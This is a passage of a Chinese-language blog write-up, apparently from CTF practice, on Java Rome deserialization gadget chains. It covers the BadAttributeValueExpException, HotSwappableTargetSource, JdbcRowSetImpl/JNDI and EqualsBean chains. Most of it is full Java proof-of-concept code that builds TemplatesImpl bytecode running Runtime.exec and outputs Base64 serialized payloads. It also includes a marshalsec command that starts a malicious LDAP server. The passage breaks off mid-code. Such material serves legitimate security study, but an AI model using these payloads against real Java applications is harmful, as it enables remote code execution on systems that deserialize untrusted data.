class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> unSerial(badAttributeValueExpException);</span><br><span class="line">        <span class="comment">// 输出序列化的Base64编码字符</span></span><br><span class="line">        Base64Encode(bs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">unSerial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bs.toByteArray()));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679315857788-f37df839-1426-44e1-87af-639d40e06ad0.png#averageHue=%232b2c28&clientId=u4875fa68-8767-4&from=paste&height=827&id=u38e52edb&name=image.png&originHeight=1034&originWidth=1889&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2488103&status=done&style=none&taskId=u6de2ed9a-380a-4382-8a09-eaffed958a9&title=&width=1511.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679315883356-8eea53ce-f624-40e3-9683-3eec113284ac.png#averageHue=%232d2d28&clientId=u4875fa68-8767-4&from=paste&height=444&id=ud4398ab5&name=image.png&originHeight=555&originWidth=1374&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1064507&status=done&style=none&taskId=u8b6d0177-597a-4fea-8da7-b27f999b6cc&title=&width=1099.2" alt="image.png"><br>在badattribute类的readObject方法中调用了toString，而这里我们让val等于ToStringBean，把链子连接起来了，因此也是可行的</p><h1 id="HotSwappableTargetSource利用链"><a href="#HotSwappableTargetSource利用链" class="headerlink" title="HotSwappableTargetSource利用链"></a>HotSwappableTargetSource利用链</h1><p>这个其实我们在之前的文章，也就是西湖论剑的easy_api里提到过，一个拿来当跳板的类，这个类有equals方法，可以触发Xstring的toString，那么也就可以接上Rome的后半段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HotVer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="comment">// 执行序列化与反序列化，并且返回序列化数据</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(h1,h1);</span><br><span class="line">        map.put(h2,h2);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> unSerial(map);</span><br><span class="line">        <span class="comment">// 输出序列化的Base64编码字符</span></span><br><span class="line">        Base64Encode(bs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">unSerial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bs.toByteArray()));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679316899374-35db9330-c33c-4ed4-93b3-302a013ab4e9.png#averageHue=%232b2c29&clientId=ue42f3e63-b411-4&from=paste&height=860&id=u53d15666&name=image.png&originHeight=1075&originWidth=2263&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3085710&status=done&style=none&taskId=u54bdda8c-a501-4814-b73f-213cf2e6200&title=&width=1810.4" alt="image.png"><br>这边的流程也很简单，首先入口还是hashmap，里面的putval函数调用了equals，这里有2个hotswapper<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679316958533-3aa1c759-7dfc-4207-b8ba-998fcbb95980.png#averageHue=%2333322d&clientId=ue42f3e63-b411-4&from=paste&height=183&id=u798fb48e&name=image.png&originHeight=229&originWidth=915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=301256&status=done&style=none&taskId=u6787a791-2a8e-4fde-8805-f5c047aa20e&title=&width=732" alt="image.png"><br>左边的是h1右边equals里面的是h2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679317010630-3fae2817-5ae2-4d39-8fa0-386f216cf546.png#averageHue=%232c2c27&clientId=ue42f3e63-b411-4&from=paste&height=110&id=u678b7b9b&name=image.png&originHeight=138&originWidth=1358&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=250692&status=done&style=none&taskId=u5f7b5cf6-6275-4972-ae2e-dd3d1f5e884&title=&width=1086.4" alt="image.png"><br>这里的target就是xstring，右边里面的内容就是ToStringBean，随之进入Xstring的equals方法里<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679317083282-027faff5-53e3-4de0-a5e1-5dd9d75152ee.png#averageHue=%2331312b&clientId=ue42f3e63-b411-4&from=paste&height=342&id=uf1bac2ed&name=image.png&originHeight=428&originWidth=1027&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=621544&status=done&style=none&taskId=uec42cfcc-607f-4c43-a320-0d70fb69008&title=&width=821.6" alt="image.png"><br>obj2就是ToStringBean，因此链子闭合，逻辑无误</p><h1 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h1><p>这个类是在FastJson反序列化里见到的一个类，这个类中调用了lookup方法，因此可以进行JNDI注入，所以JDK版本也要注意一下，jdl8的话要小于191版本<br>这个类的入口点是在一个get方法上<code>JdbcRowSetImpl.getDatabaseMetaData()</code>,而rome链中又可以调用任意get方法，那其实也就和TempaltesImpl链思路是一样的，只是在不能使用TempaltesImpl时可以进行替换<br>这里介绍一个工具，marashalsec，用来起恶意ldap和rmi服务端的一个工具，很方便<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://](http://127.0.0.1:8888/#EXP)localhost:8888/#Exploit 9999</code><br>在8888端口放上你的payload，这里就准备一个弹计算机的，名字改为Exploit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcVer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        String url=<span class="string">&quot;ldap://localhost:9999/Exploit&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line">        ToStringBean toStringBean=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        EqualsBean equalsBean=<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(equalsBean,<span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> unSerial(map);</span><br><span class="line">        <span class="comment">// 输出序列化的Base64编码字符</span></span><br><span class="line">        Base64Encode(bs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">unSerial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bs.toByteArray()));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679318636875-c46a230a-c1f3-476f-83f5-2e7e70bcd35b.png#averageHue=%2333322a&clientId=ub01cc352-541d-4&from=paste&height=1092&id=u50b072f4&name=image.png&originHeight=1365&originWidth=2482&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3897547&status=done&style=none&taskId=u285bb8d9-7d84-4059-af41-5daa38726b9&title=&width=1985.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679318669328-691bbd6d-0e4b-4114-912f-0f2145e119b1.png#averageHue=%2333342d&clientId=ub01cc352-541d-4&from=paste&height=94&id=u10c3f9b7&name=image.png&originHeight=117&originWidth=672&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=115268&status=done&style=none&taskId=ufa880594-3af3-443f-a2ea-b3b936d821d&title=&width=537.6" alt="image.png"><br>调用connect方法，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679318692729-910f3950-6130-4239-ad35-7684471fce63.png#averageHue=%232b2b27&clientId=ub01cc352-541d-4&from=paste&height=391&id=u4d9dff73&name=image.png&originHeight=489&originWidth=1645&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1096216&status=done&style=none&taskId=uf28fdbf6-6eaf-441f-8077-a22e84eab8b&title=&width=1316" alt="image.png"><br>调用lookup，触发JNDI注入，得以RCE<br>这里需要注意一下，既然是JNDI注入那么就得控制好Jdk版本问题哦</p><h1 id="EqualsBean链"><a href="#EqualsBean链" class="headerlink" title="EqualsBean链"></a>EqualsBean链</h1><p>校赛题就是被这个非预期拉。我属于是老版本没和新版本配合的很好<br>其实Rome单独拿出来也是可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">            setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">            map1.put(<span class="string">&quot;zZ&quot;</span>, templatesImpl);</span><br><span class="line">            map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">            map2.put(<span class="string">&quot;yy&quot;</span>, templatesImpl);</span><br><span class="line">            <span class="type">HashSet</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            table.add(map1);</span><br><span class="line">            table.add(map2);</span><br><span class="line">            <span class="comment">//table.put(map1, &quot;1&quot;);</span></span><br><span class="line">            <span class="comment">//table.put(map2, &quot;2&quot;);</span></span><br><span class="line">            setFieldValue(bean, <span class="string">&quot;_beanClass&quot;</span>, Templates.class);</span><br><span class="line">            setFieldValue(bean, <span 